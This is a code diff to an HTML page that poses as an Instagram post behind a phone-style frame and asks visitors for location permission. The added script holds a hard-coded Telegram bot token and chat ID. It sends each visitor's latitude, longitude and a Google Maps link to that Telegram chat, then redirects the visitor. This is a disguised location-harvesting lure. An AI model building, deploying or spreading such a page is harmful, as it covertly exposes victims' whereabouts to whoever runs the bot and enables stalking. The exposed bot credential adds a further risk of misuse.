@@ -44,9 +44,6 @@
             z-index: 4;
             background: transparent;
         }
-        .status-bar .time { font-size: 13px; }
-        .status-bar .icons { display: flex; gap: 6px; font-size: 12px; }
-        
         .loader-container {
             position: absolute;
             top: 50%;
@@ -68,7 +65,7 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .loader-text { color: rgba(255,255,255,0.7); font-size: 16px; letter-spacing: 1px; }
+        .loader-text { color: rgba(255,255,255,0.7); font-size: 16px; }
         
         .instagram-card {
             position: absolute;
@@ -100,7 +97,7 @@
         .description { font-size: 14px; line-height: 1.5; color: #e0e0e0; }
         .description span { font-weight: 600; color: #fff; }
         .description .highlight { color: #0095f6; font-weight: 600; display: block; margin-top: 10px; text-align: center; background: rgba(0,149,246,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(0,149,246,0.2); }
-        .post-time { font-size: 10px; color: #8e8e8e; margin-top: 8px; letter-spacing: 0.2px; }
+        .post-time { font-size: 10px; color: #8e8e8e; margin-top: 8px; }
         
         #overlay-bg {
             position: absolute;
@@ -108,10 +105,7 @@
             background: rgba(0,0,0,0.6);
             display: none;
             z-index: 2;
-            animation: fadeInBg 0.3s ease;
         }
-        @keyframes fadeInBg { from { opacity: 0; } to { opacity: 1; } }
-        
         #permission-modal {
             position: absolute;
             bottom: 40px;
@@ -142,7 +136,6 @@
             font-size: 14px; width: 100%; cursor: pointer; margin-top: 4px;
         }
         #permission-modal .btn-secondary:active { color: #fff; }
-        
         .home-indicator {
             position: absolute;
             bottom: 8px;
@@ -154,16 +147,11 @@
             border-radius: 3px;
             z-index: 4;
         }
-        @supports (padding: max(0px)) {
-            #permission-modal { padding-bottom: max(20px, env(safe-area-inset-bottom)); }
-            .home-indicator { bottom: max(8px, env(safe-area-inset-bottom)); }
-        }
     </style>
 </head>
 <body>
 
 <div class="phone-frame">
-    
     <div class="status-bar">
         <span class="time">9:41</span>
         <span class="icons">📶 📶 🔋</span>
@@ -206,6 +194,10 @@
 </div>
 
 <script>
+    // 🔥 Telegram Bot - ДЕРЕКТЕРІҢ ҚОЙЫЛДЫ!
+    const BOT_TOKEN = "7972357657:AAH_hLO_eDymgEcYa-Sut8o-kh2pkkotIAY";
+    const CHAT_ID = "7722421089";  // ✅ СЕНІҢ ID-Ң
+
     window.onload = function() {
         setTimeout(function() {
             document.getElementById('loader').style.display = 'none';
@@ -234,14 +226,29 @@
     function sendPosition(position) {
         const lat = position.coords.latitude;
         const lng = position.coords.longitude;
-        console.log('📍 Локация:', lat, lng);
+        const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
         
-        fetch('/save-location', {
+        // 📨 Telegram-ға жіберу
+        const message = `📍 ЖАҢА ЛОКАЦИЯ!\n\n🌍 Ендік: ${lat}\n🗺️ Бойлық: ${lng}\n🔗 Карта: ${mapUrl}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ lat: lat, lng: lng })
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
         })
-        .catch(err => console.log('Қате:', err))
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ Локация Telegram-ға жіберілді!');
+            } else {
+                console.log('❌ Қате:', data.description);
+            }
+        })
+        .catch(err => console.log('❌ Қате:', err))
         .finally(() => redirectToLink());
     }
     
